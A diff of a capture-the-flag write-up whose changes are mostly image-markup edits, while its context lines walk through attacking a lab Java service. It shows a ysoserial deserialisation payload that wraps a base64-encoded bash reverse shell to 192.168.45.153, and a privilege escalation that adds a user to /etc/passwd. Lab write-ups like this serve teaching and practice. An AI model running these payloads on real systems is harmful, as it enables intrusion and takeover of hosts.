@@ -77,7 +77,7 @@ Java Mantainer
 
 Port 80 hosted a corporate website:
 
-<figure><img src="../../../.gitbook/assets/image (1396).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1396).png>)
 
 I was rather static, so I did a `gobuster` scan on it using a few wordlists. Using `common.txt` reveals a hidden directory:
 
@@ -110,7 +110,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The `/download` endpoint just gives us the source code for this website, and it was static. The `backup_migrate` file was more interesting:
 
-<figure><img src="../../../.gitbook/assets/image (1388).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1388).png>)
 
 We can download and extract the files within this using `tar -xvf`:
 
@@ -147,7 +147,7 @@ src/main/java/com/industrial/recycler/DashboardController.java
 
 Seems that we have source code. Before delving into this, let's check out port 8080, which hosted the dashboard mentioned in the `readme.txt` from SMB.
 
-<figure><img src="../../../.gitbook/assets/image (1419).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1419).png>)
 
 The `WebSecurityConfig.java` file contained credentials needed to access the dashboard:
 
@@ -165,7 +165,7 @@ public UserDetailsService userDetailsService() {
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1417).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1417).png>)
 
 ### Source Code -> Deserialisation RCE
 
@@ -251,18 +251,16 @@ smb/pom-bak.xml:                    <artifactId>commons-collections4</artifactId
 
 `commons-collections4` was being used! Next, I checked to see if we could overwrite `recycler.ser` within the SMB directory.
 
-<figure><img src="../../../.gitbook/assets/image (1383).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1383).png>)
 
 Based on the timestamp, this worked. So now, we need to create our serialised payload using `ysoserial`.
 
-{% code overflow="wrap" %}
 ```
 $ echo 'bash -i >& /dev/tcp/192.168.45.153/21 0>&1  ' | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1My8yMSAwPiYxICAK
 
 $ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar ~/ysoserial-all.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1My8yMSAwPiYxICAK}|{base64,-d}|{bash,-i}' > recycler.ser
 ```
-{% endcode %}
 
 {% hint style="info" %}
 You must use Java 8 to make it work. The latest versions of Java cannot run `ysoserial.jar` properly.
@@ -270,7 +268,7 @@ You must use Java 8 to make it work. The latest versions of Java cannot run `yso
 
 This would generate a serialised object that we can use. Afterwards, place this within the share and click on Check Status on the website to get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (3166).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3166).png>)
 
 ## Privilege Escalation
 
@@ -307,6 +305,6 @@ recycler.ser
 
 This would bring up the `/etc/passwd` file, where we can add the new `hacker` user and use `:wq` to save the changes made. Then, `su` to hacker with `hello123` as the password:
 
-<figure><img src="../../../.gitbook/assets/image (1379).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1379).png>)
 
 Rooted!
